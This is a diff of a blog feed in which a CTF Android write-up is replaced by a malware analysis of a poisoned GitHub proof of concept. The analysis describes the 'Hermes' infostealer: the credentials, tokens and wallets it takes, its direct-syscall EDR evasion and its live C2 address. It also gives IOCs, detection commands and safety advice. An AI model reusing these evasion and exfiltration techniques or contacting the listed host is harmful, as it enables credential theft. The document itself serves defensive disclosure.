-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app-release\dist&gt; adb shell am broadcast -n com.example.oxidized_intentions/.TicketReceiver --es seed &quot;fe2o3rust&quot;</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>The app now returns the correct flag:</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/img/OXIDIZED_INTENTIONS_TFCCTF-2025/9.png"
+                     data-src="/images/img/Poisoned-PoC-2026/5.png"
                      
                 ></p>
-<p>This confirms that patching the HACKER variable successfully bypassed the security check, allowing the correct seed to produce the real flag.</p>
-<p><strong>FLAG</strong>: <strong><code>TFCCTF&#123;167e3ce3c65387c6e981c31c39ac7839&#125;</code></strong></p>
+<h2 id="Step-4-“Hermes”-the-stealer"><a href="#Step-4-“Hermes”-the-stealer" class="headerlink" title="Step 4: “Hermes”, the stealer"></a>Step 4: “Hermes”, the stealer</h2><p>This is the real payload. It never touches the disk, so I had to carve it out of the hollowed Python process’s memory.</p>
+<p>The giveaway: the process has <strong>two images</strong>. The real Python launcher is 172 KB. The image the process actually points to is <strong>12.4 MB</strong>. Python doesn’t grow like that on its own 😅</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/Poisoned-PoC-2026/6.png"
+                     
+                ></p>
+<p>It also uses <strong>direct syscalls</strong> (calling the Windows kernel directly) to slip past EDR tools that watch <code>ntdll.dll</code>.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/Poisoned-PoC-2026/7.png"
+                     
+                ></p>
+<h3 id="What-it-steals"><a href="#What-it-steals" class="headerlink" title="What it steals"></a>What it steals</h3><ul>
+<li><strong>Browsers:</strong> saved passwords, cookies and autofill (Edge, Brave, Opera GX and other Chromium browsers)</li>
+<li><strong>Discord</strong> tokens</li>
+<li><strong>Telegram</strong> sessions (enough to log in as you on another device)</li>
+<li><strong>KeePass &#x2F; KeePassXC</strong> databases</li>
+<li><strong>Crypto wallets</strong> (Electrum, Trust, Ronin, Coinbase and others)</li>
+<li>Screenshots and system info</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/Poisoned-PoC-2026/8.png"
+                     
+                ></p>
+<p>Everything gets sent to <code>194.102.104.223:8787/api/client/report</code>, and it does it again <strong>every time you log in</strong>, so the attacker always has your fresh cookies.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/Poisoned-PoC-2026/9.png"
+                     
+                ></p>
+<h3 id="The-scary-part-live-screen"><a href="#The-scary-part-live-screen" class="headerlink" title="The scary part: live screen"></a>The scary part: live screen</h3><p>It captures your screen and streams it to <code>194.102.104.223:8080/ws/publisher</code> (User-Agent <code>DesktopStreamClient/0.1</code>). It can also open a <strong>hidden desktop</strong> where the attacker uses your browser, with your logged-in accounts, without you seeing anything.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/Poisoned-PoC-2026/10.png"
+                     
+                ></p>
+<h2 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h2><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>IP</td>
+<td><code>194.102.104.223</code> (ports 8093, 8787, 8080)</td>
+</tr>
+<tr>
+<td><code>exp.py</code> &#x2F; <code>map.py</code></td>
+<td><code>f6b3e69758b54b04848137dc3b112f0f228268014e734b881cdab2c7c7b86129</code></td>
+</tr>
+<tr>
+<td>Lold loader</td>
+<td><code>b7cb766340cf4da00d990bf1dce5274c6f0fa56bde415ab525af9e4136c225bd</code></td>
+</tr>
+<tr>
+<td>Hermes (carved)</td>
+<td><code>6095794095ec9ef46ed19cd9f124404b114f829260888045312400390ec4dbbd</code></td>
+</tr>
+<tr>
+<td>Run key</td>
+<td><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\map</code></td>
+</tr>
+<tr>
+<td>File</td>
+<td><code>%LOCALAPPDATA%\map\map.py</code></td>
+</tr>
+<tr>
+<td>Command line</td>
+<td><code>python*.exe --lold-container</code></td>
+</tr>
+<tr>
+<td>Mutex</td>
+<td><code>Local\Lold_*</code></td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td><code>DesktopStreamClient/0.1</code></td>
+</tr>
+</tbody></table>
+<h2 id="Am-I-infected"><a href="#Am-I-infected" class="headerlink" title="Am I infected?"></a>Am I infected?</h2><p>Run this in PowerShell:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Get-ItemProperty</span> HKCU:\Software\Microsoft\Windows\CurrentVersion\Run | <span class="built_in">Select-Object</span> map</span><br><span class="line"><span class="built_in">Test-Path</span> <span class="string">&quot;<span class="variable">$env:LOCALAPPDATA</span>\map\map.py&quot;</span></span><br><span class="line"><span class="built_in">Get-CimInstance</span> Win32_Process | <span class="built_in">Where-Object</span> CommandLine <span class="operator">-match</span> <span class="string">&#x27;lold-container&#x27;</span></span><br><span class="line"><span class="built_in">Get-NetTCPConnection</span> | <span class="built_in">Where-Object</span> RemoteAddress <span class="operator">-eq</span> <span class="string">&#x27;194.102.104.223&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>If anything shows up: disconnect from the internet, kill the process, delete the Run key and <code>map.py</code>. Then, <strong>from another device</strong>, change your passwords, log out of all sessions (Google, Discord, Telegram) and rotate your KeePass and SSH keys. Honestly, reinstalling Windows is the safest move.</p>
+<h2 id="Takeaways"><a href="#Takeaways" class="headerlink" title="Takeaways"></a>Takeaways</h2><ul>
+<li><strong>Read every file</strong> before you run a PoC, not just the one named “exploit”. Watch for <code>subprocess</code>, <code>exec</code>, <code>base64</code> and giant encoded strings.</li>
+<li><strong>A 1 MB Python PoC is a red flag.</strong> So is a bundled <code>.exe</code>, <code>.dll</code> or password-protected zip.</li>
+<li><strong>Check the author.</strong> New account, no history, posted hours after the CVE? Be careful.</li>
+<li><strong>Use a throwaway VM.</strong> No saved passwords, no SSH keys, snapshot before and revert after.</li>
+<li><strong>Report it</strong> to GitHub if you find one.</li>
+</ul>
+<p>A PoC is someone else’s code running on your machine. Treat it that way. Stay safe 🛡️</p>
 ]]></content>
       <categories>
-        <category>CTF</category>
-        <category>Mobile</category>
-        <category>Reverse</category>
+        <category>Malware Analysis</category>
+        <category>Threat Intelligence</category>
       </categories>
       <tags>
-        <tag>Mobile</tag>
-        <tag>Android</tag>
-        <tag>apktools</tag>
-        <tag>ida</tag>
-        <tag>Reverse</tag>
+        <tag>Malware</tag>
+        <tag>Infostealer</tag>
+        <tag>GitHub</tag>
+        <tag>CVE</tag>
+        <tag>PoC</tag>
       </tags>
   </entry>
   <entry>
